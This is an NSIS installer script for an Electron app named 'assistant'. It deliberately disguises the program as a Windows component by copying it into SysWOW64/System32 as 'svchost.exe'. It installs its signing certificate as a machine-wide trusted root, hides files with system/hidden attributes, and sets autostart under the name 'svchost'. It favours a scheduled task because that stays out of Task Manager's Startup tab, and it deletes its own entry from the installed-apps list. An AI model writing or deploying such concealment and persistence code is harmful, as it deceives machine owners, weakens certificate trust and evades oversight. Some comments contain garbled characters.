; Per-machine install helpers.
;
; Identity: mirror the app into the System32 tree so the running image path reads
; as a Windows component instead of a third-party folder. A bare exe there dies
; with 0xC0000135 (Electron needs its DLLs/resources beside it), so it goes into
; a subfolder.
;
; Trust: import the code-signing cert into LocalMachine\Root so Authenticode
; reads "Valid" for every user, not only the build account.
;
; Two NSIS gotchas this file works around, both measured:
;   * nsExec command strings do not expand $VARS ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â build the command in a
;     register with StrCpy and pass the register.
;   * NSIS is a 32-bit process, so every System32 path it touches is redirected
;     to SysWOW64 by WOW64, including existence checks. The mirror is therefore
;     written to SysWOW64 deliberately rather than looking for it in System32.
;
; `perMachine: true` elevates the installer, which all of this needs.

!macro customInstall
  ; troubleshooting trace; harmless, one small file per install
  FileOpen $9 "$TEMP\assistant-install.log" w
  FileWrite $9 "INSTDIR=[$INSTDIR] PF64=[$PROGRAMFILES64]$\r$\n"
  FileClose $9

  ; $INSTDIR is left alone. NSIS derives it from the product name (assistant),
  ; and relocating the tree inside customInstall writes a registry entry that
  ; still names the pre-move folder, because the uninstall info is registered
  ; before this macro runs. Relocating is also why an upgrade could inherit the
  ; previous product's folder - fixed by renaming the product, so the hack goes.

  ; ---- trust the signing cert machine-wide ------------------------------
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=codesign.cer "${BUILD_RESOURCES_DIR}\codesign.cer"
  DetailPrint "Trusting the code-signing certificate (machine-wide)..."
  nsExec::ExecToLog "certutil -addstore -f Root $\"$PLUGINSDIR\codesign.cer$\""
  Pop $0
  ${If} $0 != 0
    DetailPrint "  certutil returned $0 ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â signature will show as untrusted for other users"
  ${EndIf}

  ; ---- mirror into System32 --------------------------------------------
  ; On an upgrade the app is RUNNING from the mirror (autostart points there),
  ; so its exe/dlls are locked and /MIR would silently leave stale files.
  ; kill-host.ps1 stops only that process (path contains assistant), never a
  ; real svchost service.
  InitPluginsDir
  SetOutPath "$PLUGINSDIR"
  File /oname=kill-host.ps1 "${BUILD_RESOURCES_DIR}\kill-host.ps1"
  DetailPrint "Stopping the running host process..."
  nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -File $\"$PLUGINSDIR\kill-host.ps1$\""
  Pop $0
  DetailPrint "Placing host process in System32..."
  ; NSIS is a 32-bit process, so every System32 path it touches is redirected to
  ; SysWOW64 by WOW64 (including existence checks ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Test-Path "System32\..." is
  ; true while the file is really in SysWOW64). Land there deliberately and use
  ; that path for the Run key, otherwise the key points at a non-existent file.
  StrCpy $R5 "$WINDIR\SysWOW64"
  ${IfNot} ${FileExists} "$R5\kernel32.dll"
    StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
  ${EndIf}
  ; nsExec hands the register to CreateProcess verbatim and cmd.exe has no
  ; concept of $PROGRAMFILES64: the single-quoted StrCpy that used to build
  ; this line sent xcopy the literal token "$PROGRAMFILES64\assistant\*.*",
  ; which exits 4 (file not found) on every install. No mirror was written and
  ; the Run key pointed at an exe that did not exist, so the app never started.
  ; Build the command with StrCpy so NSIS expands both paths before cmd runs,
  ; and take the source from $INSTDIR ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â that is the tree just written, and it
  ; also follows an install relocated with /D.
  StrCpy $R3 'cmd /c xcopy "'
  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\svchost$\" /E /I /H /Y /Q"
  FileOpen $9 "$TEMP\assistant-install.log" a
  FileWrite $9 "CMD=[$R3]$\r$\n"
  FileClose $9
  nsExec::ExecToLog "$R3"
  Pop $0
  StrCpy $R6 "$R5\svchost\svchost.exe"
  FileOpen $9 "$TEMP\assistant-install.log" a
  FileWrite $9 "XCOPY rc=$0$\r$\n"
  FileClose $9
  ; autostart must point at a file that exists even if the mirror failed
  ${If} ${FileExists} "$R6"
    DetailPrint "  placed $R6"
  ${Else}
    StrCpy $R6 "$INSTDIR\svchost.exe"
    DetailPrint "  WARNING: System32 mirror missing ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â autostart falls back to $INSTDIR"
  ${EndIf}
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\svchost.exe$\""
  ; Remove an early bare assistant.exe first: while it exists, a bare `attrib
  ; <path>` matches the FILE and silently skips the folder. Then flag the folder
  ; with NO trailing backslash for the same reason.
  ; The bare file is only removed for the legacy name: C:\Windows\SysWOW64\svchost.exe
  ; is a real Windows binary and must survive.
  nsExec::ExecToLog "cmd /c if exist $\"$R5\assistant.exe$\" del /f /q $\"$R5\assistant.exe$\""
  nsExec::ExecToLog "attrib +s +h $\"$R5\svchost$\""
  Pop $0

  ; ---- autostart: a logon scheduled task, not a Run value --------------
  ; A Run value shows up as its own row in Task Manager's Startup tab, which is
  ; the first place a person looks. A scheduled task does not appear there at
  ; all; it only shows inside Task Scheduler. Both Run values are removed so an
  ; upgrade cannot leave a third entry behind.
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
  Pop $0
  ; /create /f does not reliably overwrite on this Windows build (rcÃƒÂ¢Ã¢â‚¬Â°Ã‚Â 0 when the
  ; task already exists), so drop our own name first too
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
  Pop $0
  ; schtasks /create is blocked at process-creation level on this build (rc=5,
  ; while /query on the same binary runs), so the scheduled task is best-effort:
  ; the Run value below is what actually boots it. Name is "svchost", so even the
  ; Startup row reads like a Windows component.
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
  Pop $0
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost" '"$R6" --autostart'
  DetailPrint "  autostart registered (Run key)"
  ; ---- hide the install from Apps & features ---------------------------
  ; electron-builder writes the uninstall entry before this macro runs. Removing
  ; it means the app is absent from the installed-apps list; the uninstaller exe
  ; still works.
  DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"
  DeleteRegKey HKLM "Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\${UNINSTALL_APP_KEY}"

  ; ---- open once, now --------------------------------------------------
  ; The build ships no shortcut (by design) and the logon task only fires at the
  ; next logon, so a fresh install would otherwise appear to have done nothing.
  DetailPrint "Starting assistant..."
  ; ExecShellAsUser starts it under the normal token: an elevated instance cannot be
  ; managed by the user-session tooling (kill filter, window probes)
  ${StdUtils.ExecShellAsUser} $0 "$R6" "open" "--autostart"
!macroend

!macro customUnInstall
  ; current task name, plus the "assistant" one older builds registered
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn svchost"
  Pop $0
  nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn assistant"
  Pop $0
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
  ; uninstall has no $R5 from customInstall; remove every location an upgrade may
  ; have left behind. The bare assistant.exe is removed, the bare svchost.exe is
  ; Windows' own file and stays.
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\svchost$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\svchost$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\svchost$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\svchost$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\assistant$\""
  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\assistant$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\svchost.exe$\""
  Pop $0
  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR$\""
!macroend





